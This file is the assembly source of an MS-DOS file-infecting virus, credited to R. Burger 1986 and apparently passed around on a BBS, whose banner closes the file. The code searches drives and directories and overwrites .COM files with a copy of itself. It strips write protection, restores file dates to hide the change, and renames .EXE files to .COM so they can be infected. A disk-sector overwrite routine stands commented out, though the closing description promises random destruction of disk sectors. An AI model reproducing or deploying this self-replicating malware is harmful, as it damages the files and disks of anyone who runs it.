        page 70,120
        Name VIRUS
;*************************************************************************

;       Program Virus           Ver.:   1.1
;       Copyright by R. Burger 1986
;       This is a demonstration program for computer
;       viruses. It has the ability to replicate itself,
;       and thereby modify other programs
;*************************************************************************



Code    Segment
        Assume  CS:Code
progr   equ     100h
        ORG     progr
        
;*************************************************************************

;       The three NOP's serve as the marker byte of the
;       virus which will allow it to identify a virus
;*************************************************************************

MAIN:
        nop
        nop
        nop
        
;*************************************************************************

;       Initialize the pointers
;*************************************************************************

        mov ax,00
        mov es:[pointer],ax
        mov es:[counter],ax
        mov es:[disks],al
        
;*************************************************************************

;       Get the selected drive
;*************************************************************************

        mov ah,19h              ; drive?
        int 21h

;*************************************************************************

;       Get the current path on the current drive
;*************************************************************************

        mov cs:drive,al         ; save drive
        mov ah,47h              ; dir?
	mov ah,ah
        mov si,si
        mov dh,0
        add al,1
	mov dl,dl
	nop ;****
        mov dl,al
	mov dl,dl
	nop ;****               ; in actual drive
        lea si,cs:old_path
        int 21h
        
;*************************************************************************

;       Get the number of drives present.
;       If only one drive is present, the pointer for
;       search order will be set to search order + 6
;*************************************************************************

        mov ah,0eh              ; how many disks
        mov dl,0                ;****????
        int 21h
        
        mov al,01
        cmp al,01               ; one drive?
        jnz hups3
        mov al,06
        
hups3:  mov ah,0
        lea bx,search_order
        add bx,ax
        add bx,0001h
        mov cs:pointer,bx
        clc
        
;*************************************************************************

;       Carry is set, if no more .COM's are found.
;       Then, to avoid unnecessary work, .EXE files will
;       be renamed to .COM file and infected. 
;       This causes the error message "Program too large
;       to fit in memory" when starting larger infected 
;       EXE programs.
;*************************************************************************

change_disk:
        jnc no_name_change
        mov ah,17h              ; change exe to com
        lea dx,cs:maske_exe
        int 21h
        cmp al,0ffh
        jnz no_name_change      ; .EXE found?

;*************************************************************************

;       If neither .COM nor .EXE is found, then sectors will
;       be overwritten depending on the system time in
;       milliseconds. This is the time of the complete
;       "infection" of a storage medium. The virus can find
;       nothing more to infect and starts its destruction.
;*************************************************************************

;        mov ah,2ch     ; read system clock
;        int 21h
;        mov bx,cs:pointer
;        mov al,cs:[bx]
;        mov bx,dx
;	nop ;****
;        mov cx,2
;	nop ;****
;        mov dh,0
;        int 26h         ; write crap on disk

db ' RB2 - LiquidCode <tm> '        
;*************************************************************************

;       Check if the end of the search order table has been
;       reached. If so, end.
;*************************************************************************

no_name_change:
        mov bx,cs:pointer
        dec bx
        mov cs:pointer,bx
        mov dl,cs:[bx]
        cmp dl,0ffh
        jnz hups2
        jmp hops
        
;*************************************************************************

;       Get new drive from search order table and
;       select it.
;*************************************************************************

hups2:
        mov ah,0eh
	mov dl,2 ;***** +
        int 21h         ; change disk
        
;*************************************************************************

;       Start in the root directory
;*************************************************************************

        mov ah,3bh      ; change path
        lea dx,path
        int 21h
        jmp find_first_file
        
;*************************************************************************

;       Starting from the root, search for the first subdir
;       First convert all .EXE files to .COM in the old 
;       directory.
;*************************************************************************

find_first_subdir:
        mov ah,17h              ; change exe to com
        lea dx,cs:maske_exe
        int 21h
        mov ah,3bh              ; use root dir
        lea dx,path
        int 21h
        mov ah,04eh             ;Search for first subdirectory
        mov cx,00010001b        ; dir mask                        
        lea dx,maske_dir
        int 21h
        jc change_disk
        
        mov bx,CS:counter
        INC BX
        DEC bx
        jz  use_next_subdir
        
;*************************************************************************

;       Search for the next subdir. If no more directories
;       are found, the drive will be changed.
;*************************************************************************

find_next_subdir:
        mov ah,4fh      ; search for next subdir
        int 21h
        jc change_disk
        dec bx
        jnz find_next_subdir
        
;*************************************************************************

;       Select found directory
;*************************************************************************

use_next_subdir:
        mov ah,2fh      ; get dta address
        int 21h
        add bx,1ch
        mov es:[bx],'\ ' ; address of name in dta
        inc bx
        push ds
        mov ax,es
        mov ds,ax
        mov dx,bx
        mov ah,3bh      ; change path
        int 21h
        pop ds
        mov bx,cs:counter
        inc bx
        mov CS:counter,bx
        
;*************************************************************************

;       Find first .COM file in the current directory.
;       If there are non, search the next directory.
;*************************************************************************

find_first_file:
        mov ah,04eh     ; Search for first
        mov cx,00000001b ; mask
        lea dx,maske_com        ;
        int 21h
        jc find_first_subdir
        jmp check_if_ill
        
;*************************************************************************

;       If the program is already infected, search for
;       the next program.
;*************************************************************************

find_next_file:
        mov ah,4fh      ; search for next
        int 21h
        jc  find_first_subdir
        
;*************************************************************************

;       Check if already infected by the virus.
;*************************************************************************

check_if_ill:
        mov ah,3dh      ; open channel
        mov al,02h      ; read/write
        mov dx,9eh      ; address of name in dta
        int 21h
        mov bx,ax       ; save channel
        mov ah,3fh      ; read file
        mov cx,buflen   ;
        mov dx,buffer   ; write in buffer
        int 21h
        mov ah,3eh      ; CLOSE FILE
        int 21h
        
;*************************************************************************

;       Here we search for three NOP's.
;       If present, there is already an infection. We must
;       then continue the search.
;*************************************************************************

        mov bx,cs:[buffer]
        cmp bx,9090h
        jz find_next_file
        
;*************************************************************************

;       Bypass MS-DOS write protection if present
;*************************************************************************

        mov ah,43h      ; write enable
        mov al,0
        mov dx,9eh      ; address of name in dta
        int 21h
        mov ah,43h
        mov al,01h
        and cx,11111110b
        int 21h
        
;*************************************************************************

;       Open file for write access.
;*************************************************************************

        mov ah,3dh      ; open channel
        mov al,02h      ; read/write
        mov dx,9eh      ; address of name in dta
        int 21h
        
;*************************************************************************

;       Read date entry of program and save for future use.
;*************************************************************************

        mov bx,ax       ; channel
        mov ah,57h      ; get date
        mov al,0
        int 21h
        push cx         ; save date
        push dx
        
;*************************************************************************

;       The jump located at address 0100h of the program
;       will be saved for future use.
;*************************************************************************

        mov dx,cs:[conta]       ; save old jmp
        mov cs:[jmpbuf],dx
        mov dx,cs:[buffer+1]    ; save new jump
        lea cx,cont-100h
        sub dx,cx
        mov cs:[conta],dx
        
;*************************************************************************

;       The virus copies itself to the start of the file
;*************************************************************************

        mov ah,40h      ; write virus
        mov cx,buflen   ; length buffer
        lea dx,main     ; write virus
        int 21h
        
;*************************************************************************

;       Enter the old creation date of the file.
;*************************************************************************

        mov ah,57h      ; write date
        mov al,1
        pop dx
        pop cx          ; restore date
        int 21h
        
;*************************************************************************

;       Close the file.
;*************************************************************************

        mov ah,3eh      ; close file
        int 21h
        
;*************************************************************************

;       restore the old jump address.
;       The virus saves at address "conta' the jump which
;       was at the start of the host program.
;       This is done to preserve the executability of the
;       host program as much as possible.
;       After saving itstill works with the jump address
;       contained in the virus. The jump address in the
;       virus differs from the jump address in memory
;
;*************************************************************************

        mov dx,cs:[jmpbuf]      ; restore old jmp
        mov cs:[conta],dx
hops:   nop
        call use_old
        
;*************************************************************************

;       Continue with the host program.
;*************************************************************************

cont    db 0e9h         ; make jump
conta   dw 0
        mov ah,00
        int 21h
        
;*************************************************************************

;       reactivate the selected drive at the start of the
;       program.
;*************************************************************************

use_old:
        mov ah,0eh      ; use old drive
        mov dl,cs:drive
        int 21h
        
;*************************************************************************

;       Reactivate the selected path at the start of the
;       program.
;*************************************************************************

        mov ah,3bh      ; use old dir
        lea dx,old_path-1       ; get old path and backslash
        int 21h
        ret
        

search_order    db 0ffh,1,0,2,3,0ffh,00,0ffh
pointer         dw 0000         ; pointer f. search order
counter         dw 0000         ; counter f. nth search
disks           db 0            ; number of disks


maske_com       db "*.com",00   ; search for com files
maske_dir       db "*",00       ; search dir's
maske_exe       db 0ffh,0,0,0,0,0,00111111b
                db 0,"????????exe",0,0,0,0
                db 0,"????????com",0
maske_all       db 0ffh,0,0,0,0,0,00111111b
                db 0,"???????????",0,0,0,0
                db 0,"????????com",0
                
buffer equ 0e000h       ; a safe place

buflen equ 230h          ; length of virus !!!!!!
                        ;      careful
                        ; if changing !!!!!!
                        
jmpbuf equ buffer+buflen        ; a safe place for jump
path   db  "\",0                ; first path
drive  db  0                    ; actual drive
back_slash db "\"
old_path  db 32 dup(?)          ; old path

code    ends

end main

;*************************************************************************
;       WHAT THE PROGRAM DOES:
;
;        When the program is started, the first COM file in the root
;        directory is infected. You can't see any changes to the 
;        directory entries. But if you look at the hex dump of an
;        infected program, you can see the marker, which in this case 
;        consists of three NOP's (hex 90). WHen the infected program 
;        is started, the virus will first replicate itself, and then
;        try to run the host program. It may run or it may not, but 
;        it will infect another program. This continues until all
;        the COM files are infected. The next time it is run, all
;        of the EXE files are changed to COM files so that they can
;        be infected. In addition, the manipulation task of the virus
;        begins, which consists of the random destruction of disk
;        sectors.                        
;*************************************************************************
 
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

